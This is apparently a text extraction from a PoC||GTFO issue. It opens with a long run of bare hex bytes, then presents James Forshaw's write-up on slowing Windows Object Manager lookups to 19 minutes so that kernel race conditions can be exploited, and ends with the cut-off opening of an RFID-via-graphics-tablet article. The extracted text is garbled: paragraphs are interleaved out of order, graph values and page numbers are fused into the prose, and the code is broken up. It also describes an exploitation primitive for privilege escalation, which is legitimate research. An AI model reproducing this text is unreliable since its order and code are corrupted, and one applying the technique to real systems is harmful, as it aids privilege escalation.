06
00
0f
09
0b
bc
38
90
b1
0c
85
7a
f9
ec
0b
04
30
95
03
bd
de
10
7e
80
66
84
b8
00
06
9d
01
d4
85
7a
0e
0c
fd
0c
e4
e4
ad
69
a6
a2
98
31
6b
0b
ff
10
04
2f
a5
0f
29
bf
cf
a0
85
62
29
4c
0a
20
69
b0
3c
06
02
1d
90
7f
98
aa
69
00
c2
05
0c
68
6b
8d
49
10
a2
d9
69
a5
4a
d5
a5
8d
79
9d
b9
c9
e9
05
09
20
75
91
ac
9d
a2
49
eb
09
d0
a4
c9
b
10
00
80
66
fc
80
00
06
00
02
a9
67
bd
a9
ae
0b
85
b8
ae
2d
31
79
04
18
aa
4c
85
a8
0b
9d
be
8b
0a
03
30
be
02
eb
a5
72
5c
d0
82
a5
24
bd
c9
e6
a9
03
85
30
bd
31
85
10
85
20
4c
90
cc
ff
02
02
c9
13
62
b9
ac
be
8e
f9
ad
35
08
78
a0
8d
a6
4c
68
5c
a5
02
ff
a5
50
01
6b
08
10
7c
80
66
00
9c
00
41
d3
a9
02
a5
f9
00
bf
8e
6a
b0
f9
0c
a8
e0
8a
69
c6
7d
6a
b9
e0
f9
95
f0
29
aa
05
85
20
a9
62
09
a1
0d
a7
a6
a5
71
fa
69
aa
20
8f
11
b3
a8
71
68
6e
c1
52
03
0b
18
29
20
08
9d
ac
40
f0
f0
0c
0b
09
0b
30
c9
1f
e2
b3
7b
c8
09
0a
20
a0
eb
07
4a
38
10
38
44
ff
66
00
80
00
80
9d
04
8d
7a
0b
8d
0c
5f
8d
03
0b
8d
20
05
a8
31
6a
a4
bd
e9
03
0b
e4
0c
1c
bd
aa
ca
6b
02
29
40
4c
0b
a9
4a
a0
0a
b0
ca
8d
b4
a5
a9
bf
c9
85
a9
18
ac
aa
a9
38
69
7f
64
b0
71
0a
0a
08
03
8d
4a
b9
9d
02
10
20
09
a0
b0
d0
84
a9
6f
00
c9
a9
a8
a9
13
38
04
00
2c
00
ff
00
02
67
8d
03
f0
9d
e3
99
0c
c0
2d
8e
03
9b
b0
a9
c9
10
bd
71
0d
90
ac
b9
c6
05
f5
09
20
ac
85
03
aa
4b
d0
05
4a
85
bc
02
10
9e
a9
62
ff
85
93
c0
01
a5
ca
38
ff
ad
01
8d
b7
ba
0a
d2
b0
b0
c6
2c
e9
40
35
a9
b0
23
8d
21
78
fb
89
00
b8
84
1e
00
b9
ff
a9
38
1c
3c
38
00
80
67
a9
00
02
d4
20
5b
17
00
ad
0c
0a
5b
d0
b6
05
00
90
e0
35
0a
20
eb
42
7f
8b
72
ba
80
e6
a2
be
85
a5
a7
85
85
85
a6
de
a9
e7
1c
a9
f0
85
c7
90
a9
85
68
e0
a9
60
2d
18
ca
a9
a9
09
c0
06
04
be
0c
10
0a
0b
00
22
b2
13
20
85
e6
a9
9d
a2
6a
a9
85
e9
f5
00
00
10
20
30
00
b0
61
00
e8
d3
a9
a2
0c
8d
06
f2
b9
d2
0c
ad
98
bd
85
90
88
0b
85
1e
ad
0a
be
a0
a8
85
85
ac
7f
a2
62
d0
48
83
a2
6a
b9
09
fa
ae
8d
03
11
c0
a4
e5
10
c1
69
11
00
c6
0c
75
0b
3c
ff
71
30
c9
f6
60
a9
9d
9d
60
85
ad
a9
0a
23
6a
69
0c
8f
00
c9
80
7e
00
ec
9d
78
10
20
00
00
98
6c
8d
d0
a9
3e
04
a8
e4
c8
0c
e4
9d
ad
2e
aa
8c
6b
ce
10
85
6b
b7
0a
a5
9d
4f
b9
c9
bf
20
a5
01
4c
c9
8a
ad
2c
a5
6e
f0
18
5c
a4
8d
ad
a2
92
ad
85
a9
50
b0
fd
6e
fd
b4
09
85
95
9d
90
0a
b2
18
3e
f9
40
a5
e9
fb
00
8d
b2
ad
a4
a4
0c
8a
08
bc
20
f0
85
c9
08
10
78
7c
00
be
61
0f
ea
11
8d
e8
b9
17
ca
85
b8
00
ee
0c
a4
0c
b9
ca
d7
6a
20
bd
d2
76
ee
29
90
98
b5
79
81
20
5a
03
48
0f
95
a6
bf
08
69
09
1c
5c
0a
00
84
42
79
30
85
02
d3
10
2a
10
80
eb
e9
40
01
90
90
bd
85
0b
0a
7b
85
0b
85
a6
a2
0b
69
a3
9d
d0
90
14
0d
e1
e2
08
08
00
60
44
ff
98
63
d2
ca
8d
00
bc
00
8d
10
6a
b0
06
0c
8d
6e
f0
66
10
a5
bd
21
71
a0
29
0c
20
ba
4a
e9
aa
d0
6f
a1
90
98
d0
09
29
0a
c9
4d
c8
bd
09
d2
20
90
0a
a9
85
68
a2
0a
df
0c
02
ae
a9
ad
0a
4a
0e
02
a2
eb
20
b9
f0
ea
38
75
0a
05
d4
c0
84
43
06
02
bf
ae
a5
c9
38
78
38
60
44
80
b0
74
85
9a
1b
d4
5b
08
bc
f9
8d
03
e8
85
07
20
19
0b
c4
d0
a2
aa
0a
f2
0f
98
f0
85
4a
d0
a5
1e
b8
20
02
48
85
70
03
85
0c
85
a5
40
a9
a4
a6
a9
09
00
79
9d
30
85
a4
20
a9
73
88
0a
20
4a
b0
d6
0a
a2
af
d3
fb
85
e9
60
8d
bd
c9
20
86
0a
a5
a9
90
a0
d0
0f
a5
40
28
7c
7c
80
80
69
66
d8
d0
a9
0c
85
17
ac
c1
2d
c8
6a
d0
9b
38
10
a0
c9
0a
20
bc
30
85
4a
04
6a
29
0b
7b
a2
a2
04
a2
a9
82
09
a8
6c
90
a1
88
0a
90
d0
b3
00
71
85
a9
d3
c6
68
6d
ca
00
0a
8d
d2
be
95
04
b2
69
02
ac
0a
a5
eb
68
24
9b
8b
7c
a8
f0
9d
e1
07
17
52
f0
90
cb
40
28
00
68
80
ff
63
85
a9
a9
00
b9
68
8d
5c
0c
0a
c6
8d
18
b6
bd
09
04
02
85
fb
de
2b
6b
4a
a2
bd
03
8a
d0
0a
0a
b8
a0
e0
68
a0
b9
90
0a
a9
f0
c9
8d
f0
20
85
8d
c1
03
0a
6e
a9
b9
ae
c9
10
68
29
b7
b8
c9
86
02
a4
ad
9d
d0
85
c9
75
0b
bb
90
90
02
07
c9
a8
e0
20
02
05
e9
78
7c
66
6c
80
00
00
62
02
03
8d
00
b9
bb
0c
b9
d2
6a
bd
69
88
d3
49
98
b0
6b
b6
09
d5
98
4a
42
2a
aa
49
5c
20
20
20
86
ac
a8
02
b0
0d
a9
00
04
0c
8f
06
a7
7b
42
85
85
a5
10
00
e9
8d
10
02
0b
07
bd
b5
f5
6a
c9
a7
0a
d3
d0
7b
10
70
a9
9d
f9
f2
a9
0b
18
a5
03
23
a9
b9
03
00
6c
99
6c
80
00
63
85
20
8d
07
08
64
17
ae
e4
9d
10
0c
02
10
0a
7f
aa
5c
20
ca
d0
e9
bc
a8
a0
0c
bd
01
a5
45
a8
9b
f6
0b
68
bd
ba
a9
0b
85
c6
b0
0c
8d
b1
be
0a
73
c2
69
c7
fd
0d
9a
90
29
a9
a8
40
a8
b0
aa
05
84
d2
0a
05
30
b0
0d
10
92
b9
60
00
9d
b0
6a
d0
b2
ff
8c
85
78
6c
99
00
80
6c
68
63
0f
1d
d4
85
08
a9
be
b8
00
ef
b9
8d
eb
e5
18
a9
a6
21
10
02
f0
f9
b9
60
29
f5
aa
eb
b0
ae
a8
a2
d4
aa
f9
25
81
10
a2
88
0e
85
2d
a0
c9
a2
85
a6
69
86
40
60
0b
02
7f
00
b9
0a
2c
04
bd
b0
bf
29
b9
a9
0a
18
30
8d
09
62
a5
85
12
18
19
05
a2
85
0c
cb
08
7c
99
1c
80
6f
61
a9
ae
d0
a9
68
85
00
0c
b0
07
a4
b1
06
a5
70
69
02
79
aa
a6
49
e0
0b
d1
84
03
ba
b5
f0
a0
a4
20
08
c0
68
ba
6b
85
06
a9
d0
a0
ec
0c
1b
08
02
8a
c3
00
c3
0a
a5
38
a9
8d
8d
89
c9
0a
b9
99
f5
4c
87
de
14
a0
ad
42
44
ca
ba
84
88
0a
a0
c9
2c
12
6c
c9
a5
08
00
66
3e
80
6e
72
03
a9
20
10
b9
69
ac
99
03
e8
e5
b9
d0
c9
9d
01
85
a9
20
20
ff
70
c0
bf
f4
a8
85
e9
58
23
63
16
b5
60
40
c9
a4
a4
c9
36
39
a0
a9
8d
4c
10
4c
8d
a9
85
60
4a
c0
ad
0f
99
2c
bf
20
d2
ad
bf
a0
af
9d
09
8d
02
42
a5
0a
10
c8
ac
84
9d
07
bf
96
20
59
80
cc
7c
7c
00
63
00
67
74
8d
51
ba
85
64
bd
5f
00
2d
c8
ae
9d
69
f0
d3
b0
6a
ff
1e
62
a8
f3
cc
c0
86
b9
c8
d0
ac
a2
ad
b2
ee
f0
48
fe
6a
a5
f5
85
a5
8c
1f
fc
8d
2e
be
8f
12
69
a9
85
05
2e
95
0b
0c
9d
b0
10
09
a6
d0
ac
66
9d
1b
20
0a
75
a9
f7
10
10
84
38
bd
60
09
a6
40
a9
e9
0c
44
00
5d
00
00
00
0f
8d
b3
79
08
2a
0c
05
0a
c6
fa
00
02
19
0a
02
bd
bc
b7
b1
b9
bc
b0
08
f6
b0
20
03
42
08
1f
20
9d
02
a9
d0
11
a1
b0
68
a0
40
8d
0b
a9
a9
b7
0c
85
9d
00
69
7b
0c
b4
a5
8d
8c
11
02
4a
6a
bd
a9
0b
de
d0
6b
c9
d0
00
a9
02
d0
2c
0b
20
24
70
b3
0a
00
00
0c
44
00
63
00
72
00
d2
16
a2
a6
85
0c
ae
c8
d2
6a
0b
04
8d
85
bd
c6
ad
ad
bd
24
e9
40
af
d0
a6
ba
3d
ae
0a
20
d0
e4
12
a9
00
e4
68
85
02
a9
c9
1d
43
c9
c6
ff
f0
85
69
40
85
66
d0
fd
c9
76
99
0c
bd
49
a9
99
ad
80
ad
09
a9
ac
02
f5
8d
89
a9
84
92
a9
bf
64
0e
60
c9
85
85
7c
7c
00
3e
00
61
00
a0
02
0a
62
69
4a
c1
ca
9d
10
8e
e8
05
6d
40
6b
09
09
de
d0
0d
0a
a4
03
79
25
af
5c
c8
0a
49
b4
d0
a0
8d
60
91
a5
a9
1b
81
8c
0a
10
91
85
0e
80
ad
0a
6d
68
f9
2a
08
29
0b
a5
ad
0f
0f
66
09
85
0a
b9
02
a2
b0
c6
75
a2
0d
84
09
01
99
30
e0
a2
10
88
cc
00
0c
00
1c
00
6e
60
2f
a9
20
bc
bc
4a
0c
10
00
ef
5c
c8
d0
a4
0a
18
c9
c4
09
50
20
24
d0
4d
bd
6a
20
09
c0
b1
ff
4c
ca
8d
0e
a9
68
a9
f5
85
90
68
38
b0
f0
7b
a9
c0
0a
a9
a9
06
a5
0c
90
03
8d
62
09
95
b0
0b
4a
73
d2
71
8d
0a
11
75
0a
03
9d
d0
70
9d
da
57
04
02
90
95
60
60
0c
7e
00
00
67
46
a9
a7
45
0c
8c
9d
99
f9
03
ad
0c
c6
69
79
e5
79
02
d0
d0
31
fb
7b
f0
0a
40
9d
29
8e
02
a2
29
f3
10
09
d2
55
24
aa
18
69
33
1d
ad
14
05
a0
ff
17
d2
00
07
6d
86
20
02
f0
ca
f0
f0
ac
02
98
bd
a2
29
0a
5c
4c
ad
a0
a9
9d
80
0e
e1
b0
00
a6
d0
ca
02
ec
18
60
0c
00
46
00
65
1a
ff
8d
b0
bf
0c
8c
00
ac
c8
8e
ad
6a
02
84
c1
d3
90
f0
12
a2
b6
50
02
d2
0a
ee
ae
5c
b0
5f
03
a1
f8
d4
a9
85
6e
20
69
a2
c9
8c
fc
ad
a2
00
85
f0
29
9d
85
38
f0
ca
49
2e
0b
03
08
e8
a9
18
40
30
87
9d
09
a8
af
1c
87
55
02
84
30
09
e8
62
05
10
a9
b0
a5
60
00
00
46
80
00
a1
84
17
a5
20
bd
0c
03
5b
e8
0c
ef
10
8d
6e
9d
0a
10
4b
38
31
ca
1e
49
a4
a4
0c
2c
09
50
a0
85
a9
8d
a2
40
6b
10
84
83
0e
85
42
0b
0a
02
a9
8b
04
03
66
6e
a5
30
ae
0f
a5
60
b9
b5
e8
00
69
0a
86
9d
71
a9
ae
09
4c
8d
09
e8
66
05
9d
88
ad
2c
01
0f
4b
cb
6c
00
00
44
80
73
f0
65
02
64
23
bd
a8
c8
0c
c6
c9
0c
f4
04
18
40
99
0a
bd
a9
20
10
e0
ff
6a
d0
ca
95
a5
ac
80
63
ff
1e
04
8d
a5
04
a7
85
a0
b0
1d
e9
d2
4c
00
a2
85
a8
0b
46
6a
a6
8d
0a
e6
a5
91
e4
e0
95
31
b0
79
97
0a
30
ad
2d
23
6a
ca
c6
a6
8a
d6
10
0a
95
60
4a
99
69
7c
00
00
7c
aa
63
47
85
a9
29
b2
0c
b1
ca
ae
6a
01
85
ad
d0
98
0a
d3
a9
0f
00
6f
db
02
c9
59
c0
e0
09
7c
73
a9
f0
85
d0
8d
0e
a4
e6
e6
a0
06
2f
8c
77
09
6f
99
06
e9
b9
9d
6b
e5
89
9b
95
f0
a7
bf
f0
06
ac
a8
08
ad
0b
b9
8d
42
11
b2
0b
10
6a
c0
49
0a
f6
d2
09
bd
84
e9
06
0c
00
00
64
9c
61
35
64
d1
80
a9
91
68
10
bd
10
a4
6a
2a
24
aa
bd
0a
00
0a
fd
a7
a2
b0
20
db
01
05
70
f0
0a
08
1a
67
20
0a
d2
85
a5
a6
bd
b1
a9
6a
18
10
b8
68
20
85
3a
97
66
68
38
0b
ba
04
49
95
08
90
18
e8
49
0a
ad
0f
8e
0a
0a
a2
a9
fa
d0
d0
01
a5
bd
dd
70
8f
6b
00
85
GTFO
0c
00
18
66
be
6e
0d
a9
8d
a8
40
68
9d
f9
0c
ef
e6
8d
0c
d0
69
ad
b9
9d
d0
04
2c
05
16
b0
bf
d0
b0
40
13
c8
20
88
a9
ab
d4
ad
6e
d0
a5
a2
68
aa
1d
65
25
a0
0b
a6
ea
bb
0b
6a
a8
bd
a2
ca
a5
01
a8
c9
f1
98
e8
ff
d2
0a
0a
0c
d0
49
00
81
a9
f0
08
85
d0
20
10
05
0c
a8
b9
cb
00
00
18
66
9c
00
07
00
22
a2
8d
e4
bd
ac
99
ad
ae
be
8d
30
62
09
40
ad
12
0b
96
ca
ad
a5
45
09
ca
a5
a5
c0
f1
10
e0
b2
b5
09
29
02
6c
0a
29
8d
84
c5
c6
19
a9
b3
85
9d
9d
a5
a5
f9
03
10
eb
85
a9
29
a6
69
e0
a4
29
d2
9d
a9
0a
01
86
85
07
58
a6
87
4a
bf
bf
a9
d0
a5
8c
a5
78
00
18
fe
aa
00
07
aa
02
5f
0e
7a
0c
5e
00
8f
fb
0c
00
3a
a8
e9
0a
09
38
85
09
10
2c
c9
6b
c9
24
7e
d0
02
ad
17
8d
e6
f7
d2
7f
e6
d0
49
55
fe
a3
29
8d
20
01
a0
eb
71
c8
d0
6b
0b
d6
d2
d0
a7
01
f0
a7
31
06
62
0f
29
0f
20
ad
05
65
75
8d
60
87
8a
6a
8d
b0
c0
f7
6c
0c
cc
40
00
7e
92
80
00
07
9d
a9
a9
d2
90
1d
0c
04
0c
0b
b9
d0
a5
20
00
65
b0
a9
6a
70
03
0c
10
bc
f0
64
f0
c9
b0
20
85
09
77
9d
09
85
a6
e8
ff
91
1b
60
7f
9a
87
99
75
85
0a
0b
d0
e5
ed
ba
ad
25
aa
95
04
b5
a8
90
f0
79
87
0a
8d
d5
70
a4
8d
6a
a9
c9
9d
09
08
4d
bc
b5
5d
f0
69
40
38
18
10
ff
00
07
00
18
08
58
e6
ee
ae
c8
c9
8e
b1
ad
c8
9b
9d
6b
05
00
a9
27
4c
18
90
df
b0
50
3c
02
48
0d
66
d4
d0
16
c0
a4
c6
e6
bc
68
8d
a4
85
0b
a9
af
20
ec
b9
a9
0f
69
fc
10
8e
ad
b5
aa
a9
a8
e8
dc
e4
2a
9d
b9
8d
0a
0d
d1
cc
0b
10
01
e1
66
d2
29
1a
ec
43
43
00
78
38
18
18
80
00
07
d0
8d
20
a9
a9
0c
c0
ca
01
5d
b9
2b
f0
b6
ad
99
fe
fd
00
a6
79
7d
02
b8
03
03
a5
b0
ac
ae
c9
a6
0d
d0
85
a4
a4
a1
0f
88
04
c0
8e
ad
a5
09
23
85
3e
01
bd
90
0b
27
0c
0a
e9
9d
00
d0
e8
a6
a0
0c
c8
a2
0c
c9
a4
d0
0b
a9
85
f0
09
9d
bd
07
bf
f0
0a
c9
856f
a5 10 7e c0 55 7e 39 cf 45 4e c5 02 01 0b 7f 0a
b
b
18
a
d
8
48
a
2
a
2
f
d
b
5
0
1
0
5
GTFO
PoC233
How Slow Can You Go?
by James Forshaw
3.1
While doing my research into Windows, I tend to
find quite a few race condition vulnerabilities. Al-
though these vulnerabilities can be exploited, you
typically only get a tiny window of time in which
to do it. A fairly typical sequence of actions looks
something like this:
Investigating Object
Lookup Performance
Manager
Hidden under the hood of Windows NT is the Ob-
ject Manager Namespace (OMN). You wouldn’t typ-
ically interact with it directly as the Win32 API for
the most part hides it away. The NT kernel defines a
set of objects, such as Files, Events, Registry Keys,
that can all have a name associated with them. The
OMN provides the means to lookup these named
objects. It acts like a file system; for example, you
can specify a path to an NT system call such as
\BaseNamedObjects\MyEvent, and an event can be
thus looked up.
There are two special object types for use in the
OMN: Object Directories and Symbolic Links. Ob-
ject Directories act as named containers for other
objects, whereas Symbolic Links allow a name to be
redirected to another OMN path. Symbolic Links
are used quite a lot; for example, the Windows drive
letters are really symbolic links to the real storage
device. When we call an NT system call, the kernel
must lookup the entire path, following any symbolic
links until it either reaches the named object or fails
to find a match.
In this exploit we want to make the process of
looking up a resource we control as slow as possible.
For example, if we could make it take 1 or 2 seconds,
then we’ve got a massive window of opportunity to
win the race condition. Therefore I want to find
a way of manipulating the Object Manager lookup
process in such a way that we achieve this goal. I
am going to present my approach to achieving the
required result.
A note about my setup: for my testing I am go-
ing to open a named Event object. All testing is
done on my 2.8GHz Xeon Workstation. Although it
has 20 physical cores, the lookup process won’t be
parallelized, and therefore that shouldn’t be an is-
sue. Xeons tend to have more L2/L3 cache than con-
sumer processors, but if anything this should only
make our timings faster. If I can get a long lookup
time on my Workstation, it should be possible on
pretty much anything else running Windows. Fi-
nally, this is all tested on an up-to-date Windows 10;
however, not much has changed since Windows 7
that might affect the results.
First let’s just measure the time it takes to do
1. Do some security check.
2. Access some resource.
3. Perform secure action.
In this case the race condition is between the
security check and the action. If we can modify
the state of the system in between those actions,
it might be possible to elevate privileges or do un-
expected things. The time window is typically very
small, but if the code is accessing some controllable
resource in between the check and the action, we
might still be able to create a very reliable exploit.
I wanted to find a way of increasing the time win-
dow to win the race in cases where the code accesses
a resource we control. The following is an overview
of the thought process I went through to come up
with a working solution.
24length slightly, but not enough to make significant
impact. Therefore, we’ll perform the Event opening
on names between 1 character and 32,000 characters
in length. The results are shown below:
a normal lookup. We’ll repeat the lookup a 1, 000
times and take the average. The results are prob-
ably what we’d expect: the lookup process for a
simple named Event is roughly 3μs. That includes
the system call transition, lookup process, and the
access check on the Event object. Although in the-
ory you could win a race, it seems pretty unlikely,
even on a multi-core processor. So let’s think about
a way of improving the lookup time (and when I say
“improve”, I mean making the lookup time slower).
An Object Manager path is limited to the
maximum string size afforded by the UNI-
CODE_STRING structure.
struct UNICODE_STRING {
USHORT Length ;
USHORT MaximumLength ;
4
PWSTR B u f f e r ;
}
0.1
0.075
0.05
0.025
0
2
0
8000
16000
24000
32000
Name Length in Characters
Although this is a little noisy, our assumption
of a linear lookup time seems correct. The longer
the string, the longer it takes to look it up. For a
32,000 character long string, this seems to top out
at roughly 90μs – still not enough in my opinion for
a useful primitive, but certainly a start.
Now let’s instead look at the recursive directory
approach. In this case the upper bound is around
16,000 directories. This is because each path compo-
nent must contain a backslash and a single charac-
ter name (i.e. \A\A\A...). Therefore our maximum
path limit is halved. Of course we’d make the as-
sumption that the time to go through the lookup
process is going to be greater than the time it takes
to compare 4 Unicode characters, but let’s test to
make sure. The results are shown below:
We can see that the Length member is an un-
signed 16 bit integer, limiting the maximum length
to 2 16 − 1. This, however, is a byte count, so in
fact this limits us to 2 15 − 1 or 32767 characters.
From this result, there are two obvious possible ap-
proaches we can take:
1. Make a path that contains one very long name.
The lookup process would have to compare the
entire name using a typical string comparison
operation to verify it’s accessing the correct
object. This should take linear time relative
to the length of the string.
2. Make multiple small named directories and re-
peat. E.g., \A\A\A\A\...\EventName. The
assumption here is that each lookup takes a
fixed amount of time to complete. The oper-
ation will again be linear time relative to the
depth of recursion of the directories.
Now it would seem likely that the cost of the en-
tire operation of a single lookup will be worse than
a string comparison, a primitive that is typically op-
timized quite heavily. At this point we have not had
to look at any actual kernel code, and we won’t start
quite yet, so instead empirical testing seems the way
to go.
Let’s start with the first approach, making a
long string and performing a lookup on it. Our
name limit is around 32767, although we’ll need
to be able to make the object in a writable direc-
tory such as \BaseNamedObject, which reduces the
4
3
2
1
0
0
4000
8000
12000
16000
Directory Count
Well, I think that’s unequivocal. For 16,000 re-
cursive depth, the average lookup time is around
3700μs, or around 40 times larger than the long path
name lookup result. Now, of course, this comes with
downsides. For a start, you need to create 16,000 or
so directory objects in the kernel. At least on a mod-
25ern 64 bit Windows this isn’t likely to be too taxing,
however it’s still worth bearing in mind. Also the
process must maintain a handle to each of those di-
rectories, because otherwise they’d be deleted (as a
normal user cannot make kernel objects permanent).
Fortunately our handle limit for a single process is
of the order of 16 million, so we’re a couple of orders
of magnitude below the limit of that.
Ultimately though we can only do this 64 times.
Why, can’t we do this indefinitely? Well, no—for
a fairly obvious reason: each time a symbolic link
is encountered the kernel restarts the parsing pro-
cesses; if you pointed a symbolic link at itself, you’d
end up in an infinite loop. The reparse limit of 64
prevents that from becoming a problem. The re-
sults are as we expected, the time taken to lookup
our event is proportional to both the number of sym-
bolic links and the number of recursive directories.
For 64 symbolic links and 16,000 directories it takes
approximately 200ms (note I’ve had to change the
order of the result now to milliseconds). At around
1
5 of a second that should be enough, right? Sure,
but I’m greedy; I want more. How can we make the
lookup time even worse?
Now, is 3700μs going to be enough for us?
Maybe, it’s certainly orders of magnitude greater
than 3μs. But can we do better? We’ve now run
out of path space, we’ve filled the absolute maxi-
mum allowed string length with recursive directory
names. What we could do with is a method of mul-
tiplying that effect without requiring a longer path.
We can do this by using Object Manager symbolic
links. By placing the symbolic link as the last com-
ponent of the long path we can force the kernel to
reparse, and start the lookup all over again. On the
final lookup we’ll just point the symbolic link to the
target.
At this point it’s time to break out the disassem-
bler and see how the lookup process works under the
hood in the kernel. First off, let’s see what an object
directory structure looks like. We can dump it from
a kernel debugging session using WinDBG with the
26command dt nt!_OBJECT_DIRECTORY. Converted
back to a C-style structure, it looks something like
the following:
creating only 32,000 or so colliding entries before we
run out of strings to create them, but, as we’ll see
in a minute, that’s not a problem. Let’s look at the
results of doing this for a single directory:
1 struct OBJECT_DIRECTORY
{
3
POBJECT_DIRECTORY_ENTRY HashBuckets [ 3 7 ] ;
EX_PUSH_LOCK Lock ;
5
PDEVICE_MAP DeviceMap ;
ULONG S e s s i o n I d ;
7
PVOID NamespaceEntry ;
ULONG F l a g s ;
9
POBJECT_DIRECTORY ShadowDirectory ;
}
Based on the presence of the HashBucket field,
it’s safe to assume that the kernel is using a hash
table to store directory entries. This makes some
sense, because if the kernel just maintained a list
of directory entries, this would be pretty poor for
performance. With a hash table the lookup time
is much reduced as long as the hashing algorithm
does a good job of reducing collisions. This is only
the case though if the algorithm isn’t being actively
exploited. As we’re trying to increase the cost of
lookups, we can intentionally add entries with col-
lisions to make the lookup process take the worst
case time, which is linear relative to the number of
entries in a directory. This again provides us with
another scaling factor, and in this case the number
of entries is only going to be limited by available
memory, as we are never going to need to put the
name into the path.
So what’s the algorithm for the hash? The
main function of interest is ObpLookupObject-
Name, which is referenced by functions such as Ob-
ReferenceObjectByName. The directory entry logic
is buried somewhere in this large function; however,
fortunately there’s a helper function ObpLookup-
DirectoryEntryEx, which has the same logic (it
isn’t actually called by ObpLookupObjectName, but
it doesn’t matter) that is smaller and easier to re-
verse (Figure 10).
So the hashing algorithm is pretty simple; it re-
peatedly mixes the bits of the current hash value
and then adds the uppercase Unicode character to
the hash. We could work out a clever way of getting
hash collisions from this, but actually it’s pretty sim-
ple. The object manager allows us to specify names
containing NULL characters, therefore if we take our
target name, say ‘A’, and prefix it with increasing
length strings containing only NULL, we get both
Hash and Bucket collisions. This does limit us to
0.6
0.45
0.3
0.15
0
0
4000
8000
12000
16000
Collisions
Yet again, a nice linear graph. For a given col-
lision count it’s nowhere near as good as the recur-
sive directory approach, but it is a multiplicative
factor in the lookup time, which we can abuse. So
you’d think we can now easily apply this to all our
16,000 recursive directories, add in symbolic links,
and probably get an insane lookup time. Yes, we
would, however there’s a problem, insertion time.
Every time we add a new entry to a directory, the
kernel must do a lookup to check that the entry
doesn’t already exist. This means that, for every
entry we add, we must do (n − 1) 2 checks in the
hash bucket just to find that we don’t have the en-
try before we insert it. This means that the time
to add a new entry is approximately proportional to
the square of the number of entries. Sure it’s not
a cubic or exponential increase, but that’s hardly a
consolation. To prove that this is the case we can
just measure the insertion time:
6000
4500
3000
1500
0
0
4000
8000
12000
Directory Count
16000
That graph shows a pretty clear n 2 trend for the
insertion time. If, say, we wanted to create a direc-
tory entry with 16,000 collisions, it takes close to 5.5
seconds. If we wanted to then do that for all 16,000
272
4
6
8
10
12
POBJECT_DIRECTORY ObpLookupDirectoryEntryEx (POBJECT_DIRECTORY D i r e c t o r y ,
PUNICODE_STRING Name ,
ULONG A t t r i b u t e F l a g s ) {
BOOLEAN C a s e I n S e n s i t i v e = ( A t t r i b u t e F l a g s & OBJ_CASE_INSENSITIVE) != 0 ;
SIZE_T CharCount = Name−>Length / s i z e o f (WCHAR) ;
WCHAR∗ B u f f e r = Name−>B u f f e r ;
ULONG Hash = 0 ;
while ( CharCount ) {
Hash = ( Hash / 2 ) + 3 ∗ Hash ;
Hash += RtlUpcaseUnicodeChar ( ∗ B u f f e r ) ;
B u f f e r ++;
CharCount−−;
}
14
16
18
20
22
24
OBJECT_DIRECTORY_ENTRY∗ Entry = D i r e c t o r y −>HashBuckets [ Hash % 3 7 ] ;
while ( Entry ) {
i f ( Entry−>HashValue == Hash ) {
i f ( R t l E q u a l U n i c o d e S t r i n g (Name ,
ObpGetObjectName ( Entry−>O b j e c t ) , C a s e I n S e n s i t i v e ) ) {
O b R e f e r e n c e O b j e c t ( Entry−>O b j e c t ) ;
return Entry−>O b j e c t ;
}
}
Entry = Entry−>ChainLink ;
}
26
return NULL;
28 }
Figure 10. ObpLookupDirectoryEntryEx()
28mant relative to actually creating all those directo-
ries if only because of the cache effects of the pro-
cessor. But hopefully it won’t be too far behind.
4
Linear Sub
recursive directory entries, it would take around 24
hours! Now, I think we’re going a bit over the top
here, and by fiddling with the values we can get
something that doesn’t take too long to set up and
gives us a long lookup time. But I’m still greedy; I
want to see how far I can push the lookup time. Is
there any way we can get the best of all worlds?
The final piece of the puzzle is to bring in Shadow
directories, which allow the Object Manager a fall-
back path if it can’t find an entry in a directory.
You can use almost any other Object Manager direc-
tory as a shadow, which will allow us to control the
lookup behavior. A Shadow Directory has a crucial
difference from symbolic links, as it doesn’t cause a
reparse to occur in the lookup process. This means
they’re not restricted to the 64 reparse limit. As
each lookup consumes a path component, eventually
there will be no more paths to lookup. If we put to-
gether two directories in the following arrangement,
we can pass a similar path to our recursive directory
lookup, without actually creating all the directories.
Directory
Linear
Shadow
Directory
3
2
1
0
0
4000
8000
12000
Directory Count
16000
Looks good. Yes, the performance is lower than
actually creating the directories, but once we bring
collisions into the mix, that’s not really going to
matter much. So the final result is that instead of
creating 16,000 directories with 16,000 collisions we
can do it with just 2 directories, which is far more
manageable and only takes around 11 seconds on
my workstation. So, to sign off, let’s combine every-
thing together.
Path: \A\A\A\A\A ...
1. 16,000 path components using 2 object direc-
tories in a shadow configuration
Lookup
2. 16,000 collisions per directory
3. 64 symbolic link reparses
A
A
And the resulting time for a single lookup on
my workstation is *drum roll please* 19 minutes! I
think we might just be able to win the race condition
with that.
Code examples can be found attached to this
document. 10
Shadow Directory
Lookup
So how does this actually work? If we open a
path of the form \A\A\A\A\A..., the kernel will first
lookup the initial ‘A’ directory. This is the directory
on the left of the diagram. It will then try to open
the next ‘A’ directory, which is on the right, which
again it will find. Next the kernel again looks up
‘A’, but in this case it doesn’t exist. As the direc-
tory has a shadow link to its parent, it looks there
instead, finds the same ‘A’ directory, and repeats
the process. This will continue until we run out of
path elements to lookup.
So let’s determine the performance of this ap-
proach. We’d perhaps expect it to be less perfor-
10 unzip
3.2
Conclusion
So after all that effort we can make the kernel take
around 19 minutes to lookup a single controlled re-
source path. That’s pretty impressive. We have
many options to get the kernel to start the lookup
process, allowing us to use not just files and registry
keys but almost any named event. It’s a typical tale
of unexpected behavior when facing pathological in-
put, and it’s not really surprising Microsoft wouldn’t
optimize for this use case.
pocorgtfo13.pdf object_manager_lookup_poc.cs
294
The FaceWhisperer for USB Glitching; or,
Reading RFID with ROP and a Wacom Tablet
by Micah Elizabeth Scott
Not only are these peripherals small computers
with storage and vulnerabilities and secrets, they
typically have very direct access to their own hard-
ware. It’s often firmware’s responsibility to set up
clocks, program power converters, and process ana-
log signals. Projects like BadUSB have focused on
reprogramming a USB device to attack the com-
puter they’re attached to. What about using the
available low-level peripherals in ways they weren’t
intended?
I recently made a video, a “Graphics Tablet
Primer for Hackers,” going into some detail on how a
pen tablet input device actually works. I compared
the electromagnetic power and data transfer to the
low-frequency RFID cards still used by many door
access control systems. At the time this was just a
convenient didactic tool, but it did start me won-
dering just how hard it would be to use a graphics
tablet to read 125 kHz RFID cards.
I had somewhat arbitrarily chosen a Wacom
CTE-450 (Bamboo Fun) tablet for this experiment.
I had one handy, and I’d already done a little pre-
liminary reversing on its protocol and circuit design.
It’s old enough that it didn’t seem to use any cus-
